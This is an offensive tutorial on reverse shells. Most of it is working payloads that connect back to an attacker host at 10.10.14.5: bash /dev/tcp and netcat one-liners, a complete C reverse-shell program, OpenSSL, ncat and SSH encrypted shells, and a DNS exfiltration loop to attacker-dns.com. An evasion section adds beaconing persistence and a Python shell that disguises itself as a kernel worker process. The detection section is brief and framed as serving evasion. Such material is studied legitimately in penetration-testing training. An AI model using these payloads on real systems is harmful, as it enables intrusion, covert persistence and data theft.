Reverse Shells

Reverse shell construction, delivery, upgrading, and detection, from bash one-liners to encrypted tunnels, with manual implementations in C, Python, and assembly.

Overview

A reverse shell makes the target open a connection back to a listener you control, then routes the target shell's standard streams over that socket. After reading this article you can pick a delivery method, write the payload in any language available on the target, upgrade a dumb shell to a full TTY, and recognize the traffic from the defender's side.

What a Reverse Shell Is

A reverse shell is a network connection initiated by the target machine, connecting back to an attacker-controlled listener, then redirecting the target's stdin, stdout, and stderr through that socket. The attacker types commands on their terminal; the target executes them and sends output back.

Reverse vs Bind

Most networks block inbound connections ( NAT , firewalls, ISP CG NAT ) but allow outbound connections on common ports (80, 443, 53, 8080). A reverse shell exploits this asymmetry: the target reaches out, not the attacker. 

Attacker (listening)                    Target (connecting)
┌──────────────────┐                    ┌──────────────────┐
│ nc -lvnp 4444    │ ◄──── TCP ──────── │ /bin/sh → socket │
│                  │     connection     │ stdin  ← socket   │
│ types commands   │ ─────► data ────► │ stdout → socket   │
│ sees output      │ ◄───── data ────  │ stderr → socket   │
└──────────────────┘                    └──────────────────┘

The syscall sequence on the target is socket() , connect() , dup2() three times, then execve() .

Why dup2() Makes It Work

A Unix process inherits file descriptors 0 (stdin), 1 (stdout), and 2 (stderr) from its parent. When you open a socket with socket() , you get a new file descriptor (typically fd 3). dup2(sockfd, 0) clones the socket fd onto fd 0, closing the original stdin and making fd 0 point to the socket instead. Repeat for fd 1 and fd 2. Now when /bin/sh reads from fd 0, it reads network data; when it writes to fd 1 or 2, it writes network data.

Without dup2 , the shell's input/output would still go to the original terminal, and the socket would be useless: you would have a connection but no shell interaction.

Reverse Shell One-Liners

Every target is different. One language may be available when others are not. Know them all.

Bash

# Classic /dev/tcp (bash compiled with --enable-net-redirections)
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Alternative syntax — same thing
bash -i 5<>/dev/tcp/10.10.14.5/4444 0<&5 1>&5 2>&5

# exec-based (redirects the current shell's fd table)
exec 5<>/dev/tcp/10.10.14.5/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# If /dev/tcp is unavailable (compiled without net-redirections):
# Fall back to named pipes + netcat
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

Shell Upgrading - From Dumb to Full TTY

An unupgraded reverse shell is fragile: - Ctrl+C kills the entire connection (SIGINT goes to the shell process, not just the running command) - No tab completion - No arrow keys (cursor escape sequences printed as raw bytes: ^[[A ) - sudo , su , ssh , vim refuse to run without a TTY - stty commands fail with "not a tty"

The upgrade process layers a pseudo-terminal ( PT Y) between the shell and the socket. The PT Y intercepts terminal control sequences locally rather than sending them across the network.

Step-by-Step Full TTY Upgrade

# ── Step 1: Spawn a PTY ──
# On the target shell (any of these):
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null      # if python is unavailable, use script

# ── Step 2: Background the shell ──
# Press Ctrl+Z in your attacker terminal
# The target shell is suspended and you're back at your local shell.

# ── Step 3: Configure local terminal ──
# On your attacker machine:
stty raw -echo     # Switch terminal to raw mode (passes all keystrokes through)
fg                 # Bring the target shell back to foreground

# ── Step 4: Set terminal type on target ──
# Now back in the target shell (still raw mode):
export TERM=xterm-256color
export SHELL=/bin/bash

# ── Step 5: Set correct terminal size ──
# On attacker (in a separate terminal window, or before connecting):
stty size          # Output: 24 80 (rows columns)
# On target shell:
stty rows 24 columns 80

# ── Verification ──
# These should now work:
#   - Tab completion
#   - Arrow keys for history
#   - Ctrl+C to interrupt running command (not kill the shell)
#   - vim, nano, less, man
#   - sudo, su, ssh

Why 'stty raw -echo' is necessary

By default, your local terminal is in cooked (canonical) mode: the kernel buffers input until Enter is pressed, processes backspace, and echoes characters locally. The PT Y on the target also does terminal processing. Double-processing corrupts control characters. stty raw turns off local processing so raw bytes pass directly to the PT Y on the target.

Automated TTY Upgrade Script

#!/bin/bash
# upgrade-tty.sh — Run on attacker machine after receiving a reverse shell
# Usage: ./upgrade-tty.sh

Reverse Shell in C

Compile statically for maximum portability; the binary runs on any Linux with a matching architecture regardless of installed libraries. 

/*
 * reverse-shell.c — Minimal reverse shell client in C.
 * Compile: gcc -static -o reverse-shell reverse-shell.c
 * Run is self-explanatory: ./reverse-shell
 *
 * This binary connects back, redirects fd 0/1/2, and spawns /bin/sh.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define ATTACKER_IP   "10.10.14.5"
#define ATTACKER_PORT 4444

int main(void) {
    int sockfd;
    struct sockaddr_in server_addr;

    /* Step 1: Create TCP socket */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    /* Step 2: Build target address structure */
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons(ATTACKER_PORT);

    if (inet_pton(AF_INET, ATTACKER_IP, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sockfd);
        return EXIT_FAILURE;
    }

    /* Step 3: Connect to the attacker */
    if (connect(sockfd, (struct sockaddr *)&server_addr,
                sizeof(server_addr)) < 0) {
        perror("connect");
        close(sockfd);
        return EXIT_FAILURE;
    }

    /* Step 4: Duplicate socket fd onto stdin, stdout, stderr */
    dup2(sockfd, STDIN_FILENO);   /* fd 0 → socket */
    dup2(sockfd, STDOUT_FILENO);  /* fd 1 → socket */
    dup2(sockfd, STDERR_FILENO);  /* fd 2 → socket */

    /* fd 3 (original socket) is no longer needed after dup2 */
    close(sockfd);

    /* Step 5: Execute /bin/sh. It inherits the dup2'd fds. */
    execl("/bin/sh", "sh", "-i", (char *)NULL);

    /* execl only returns on error */
    perror("execl");
    return EXIT_FAILURE;
}

gcc -static -Wall -Wextra -O2 -o reverse-shell reverse-shell.c

# Verify it's static (no dynamic library dependencies)
ldd reverse-shell 2>&1
# Output: "not a dynamic executable" — perfect for portability

# Check file size

Encrypted Reverse Shells

Plain TCP reverse shells transmit commands and output in cleartext, visible to any intermediate network device. Encrypted shells evade content-based detection and protect sensitive data.

Method 1: OpenSSL Encrypted Tunnel

# ── Attacker (listener) ──
# Generate a self-signed certificate (one-time setup)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem \
    -days 365 -nodes -subj "/CN=localhost"

# Start SSL listener
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# ── Target (reverse shell) ──
# Connect back with SSL encryption
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/f

Method 2: Ncat SSL

# Attacker
ncat --ssl -lvnp 4444

# Target
ncat --ssl -e /bin/bash 10.10.14.5 4444

Method 3: SSH Reverse Tunnel

# On target (SSH client must be available):
ssh -R 4444:localhost:22 attacker@10.10.14.5 -N -f
# This forwards port 4444 on the attacker to port 22 on the target.
# Then from the attacker: ssh localhost -p 4444

# Combined with a shell: create a user on the attacker for this purpose
# On target:
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -R 4444:localhost:4444 victim@10.10.14.5 \
    "nc -lvnp 9999" &
sleep 2
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

Reverse Shell Over DNS

When outbound TCP is filtered but DNS resolves are allowed, tunnel shell I/O through DNS queries. The dnscat2 tool and iodine are purpose-built for this. A manual approach uses xxd + dig + nc : 

# This is a conceptual demonstration — in practice, use dnscat2
# Target: encode command output as hex in DNS queries to attacker's DNS server
while read command; do
    result=$($command 2>&1 | xxd -p | tr -d '\n')
    # Split result into 60-byte chunks and send as subdomain queries
    for chunk in $(echo $result | fold -w 60); do
        dig +short $chunk.attacker-dns.com
    done
done

Detecting Reverse Shells

Understanding detection helps evasion. Detection vectors blue teams use:

# 1. Network connections — look for outbound connections to unusual ports
ss -tunap | grep ESTAB

# 2. Unexpected child processes — shell spawned from web server process
ps auxf | grep -A5 -B5 'nginx\|apache\|httpd'

# 3. Anomalous file descriptors — webserver with fd pointing to a socket
ls -la /proc/<web_pid>/fd/

# 4. Process ancestry — /bin/sh with parent process being a web server
pstree -p | grep -i 'sh\|bash' | grep -v 'sshd\|login'

# 5. Shell history manipulation — cleared history after commands
cat ~/.bash_history | wc -l   # suspiciously empty

Evasion Techniques

# 1. Use common outbound ports (80, 443, 53, 8080) to blend with legitimate traffic
# Listener: nc -lvnp 443 (requires root to bind <1024)
# Target:   bash -i >& /dev/tcp/10.10.14.5/443 0>&1

# 2. Interval-based connection (beaconing) to avoid constant connections
while true; do
    bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 2>/dev/null
    sleep 300  # reconnect every 5 minutes
done &

# 3. Execute shell in memory (fileless) — avoids writing to disk
# Use the Python one-liner (no file written to disk)
# Or: /dev/shm/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
# /dev/shm is a tmpfs — contents exist only in RAM

# 4. Rename the shell process to blend in
# Spawn bash, then hide the process name via exec
python3 -c '
import socket,subprocess,os,ctypes
libc=ctypes.CDLL("libc.so.6")
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
libc.prctl(15,b"[kworker/u:3]",0,0,0)  # PR_SET_NAME
subprocess.call(["/bin/bash","-i"])
'
